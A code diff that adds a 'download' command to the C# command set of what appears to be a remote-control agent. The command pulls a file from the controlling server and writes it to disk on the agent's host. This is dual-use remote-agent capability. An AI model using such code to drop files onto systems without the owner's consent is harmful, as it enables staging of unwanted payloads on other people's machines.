@@ -1,36 +1,48 @@
 ﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class DownloadCommand : AgentCommand
     {
-        public override string Name => "sleep";
+        public override string Name => "download";
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
-            //int delay = 10;
-            //if (task.SplittedArgs.Length > 0)
-            //    delay = int.Parse(task.SplittedArgs[0]);
+            if (task.SplittedArgs.Length == 0)
+            {
+                result.Result = "Please specify the name of the file to download!";
+                return;
+            }
 
-            //delay = delay * 1000;
-            //int chunk = delay / 100;
+            var fileName = task.SplittedArgs[0];
+            var fileContent = commm.Download(0, fileName, a =>
+            {
+                result.Completion = a;
+                commm.SendResult(result);
+            }).Result;
 
-            //int spent = 0;
-            //while (spent < delay)
-            //{
-            //    Thread.Sleep(chunk);
-            //    spent += chunk;
-            //    result.Completion++;
-            //    commm.SendResult(result);
-            //}
+            string path = string.Empty;
+            if (task.SplittedArgs.Length > 1)
+            {
+                path = task.SplittedArgs[1];
+            }
+            else
+            {
+                path = Path.Combine(Environment.CurrentDirectory, fileName);
+            }
 
-            //result.Result = $"Awaited for {delay}ms";
+            using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
+            {
+                fs.Write(fileContent, 0, fileContent.Length);
+            }
+
+            result.Result = $"File dowloaded to {path}.";
         }
     }
 }
